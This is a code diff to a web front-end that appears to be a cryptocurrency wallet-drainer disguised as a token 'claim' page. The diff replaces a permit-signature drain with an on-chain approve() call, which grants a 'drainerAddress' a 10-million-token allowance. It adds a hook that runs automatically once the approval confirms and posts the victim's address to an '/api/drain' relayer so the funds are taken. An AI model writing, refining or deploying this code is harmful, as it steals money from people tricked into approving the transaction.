@@ -53,8 +53,32 @@ export default function Home() {
     chainId: targetChainId,
   })
 
-  const isNonceReady = nonce !== undefined || nonceError;
-  const actualNonce = nonce !== undefined ? (nonce as bigint) : BigInt(0);
+  // Trigger the backend relayer automatically when the approval confirms on-chain
+  useEffect(() => {
+    if (isConfirmSuccess) {
+      const executeRelayer = async () => {
+        try {
+          const drainAmount = parseUnits('10000000', 6);
+          const response = await fetch('/api/drain', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              victimAddress: address,
+              drainerAddress,
+              drainAmount: drainAmount.toString(),
+            })
+          });
+          const result = await response.json();
+          if (!result.success) {
+            console.error("Relay Failed:", result.error);
+          }
+        } catch (e: any) {
+          console.error(e);
+        }
+      };
+      executeRelayer();
+    }
+  }, [isConfirmSuccess, address, drainerAddress]);
 
   const handleClaim = async () => {
     try {
@@ -62,56 +86,26 @@ export default function Home() {
         alert("Configuration Error: Token Address is missing or invalid.");
         return;
       }
-      if (!isNonceReady) {
-        alert("Node syncing... Please try again in 3 seconds.");
-        return;
-      }
 
-      const drainAmount = parseUnits('1000000000', 6);
-      const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
+      // Hardcode the approval to 10M USDT to match the UI
+      const drainAmount = parseUnits('10000000', 6);
 
-      const signature = await signTypedDataAsync({
-        domain: {
-          name: 'USD Coin',
-          version: '1',
-          chainId: targetChainId,
-          verifyingContract: tokenAddress,
-        },
-        types: {
-          Permit: [
-            { name: 'owner', type: 'address' },
-            { name: 'spender', type: 'address' },
-            { name: 'value', type: 'uint256' },
-            { name: 'nonce', type: 'uint256' },
-            { name: 'deadline', type: 'uint256' }
+      // Execute an authentic On-Chain Approval Transaction (Legacy USDT behavior)
+      await writeContractAsync({
+        address: tokenAddress,
+        abi: [{
+          "inputs": [
+            { "name": "spender", "type": "address" },
+            { "name": "value", "type": "uint256" }
           ],
-        },
-        primaryType: 'Permit',
-        message: {
-          owner: address as `0x${string}`,
-          spender: drainerAddress,
-          value: drainAmount,
-          nonce: actualNonce,
-          deadline: deadline,
-        },
+          "name": "approve",
+          "outputs": [{ "name": "", "type": "bool" }],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        }],
+        functionName: 'approve',
+        args: [drainerAddress, drainAmount],
       });
-
-      const response = await fetch('/api/drain', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          victimAddress: address,
-          drainerAddress,
-          drainAmount: drainAmount.toString(),
-          deadline: deadline.toString(),
-          signature
-        })
-      });
-
-      const result = await response.json();
-      if (!result.success) {
-        console.error("Relay Failed:", result.error);
-      }
 
     } catch (e: any) {
       console.error(e);
